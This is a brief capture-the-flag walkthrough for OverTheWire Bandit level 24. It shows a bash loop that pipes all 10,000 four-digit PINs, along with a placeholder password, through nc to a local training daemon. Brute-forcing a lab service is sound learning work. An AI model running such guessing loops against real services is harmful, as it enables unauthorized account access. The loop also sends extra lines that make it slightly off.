# Bandit Level 24 → Level 25

## 🧠 Objective
A daemon is listening on port 30002 and will give you the password for bandit25 if given the password for bandit24 and a secret numeric 4-digit pincode. There is no way to retrieve the pincode except by going through all of the 10000 combinations, called brute-forcing.
You do not need to create new connections each time
---

## 🧰 Tools & Commands Used
- `nc`
-  `ssh`


## 🕵️ Walkthrough

```bash
# Step 1: Connect via SSH
ssh bandit24@bandit.labs.overthewire.org -p 2220

#Step 2: Run a shell to brute-force through the pin combination
for i in {0000..9999}; do echo $i; echo <password> $i; done | nc localhost 30002
```
## 📌 Key Takeaways
- Learned about how brute forcing is implemented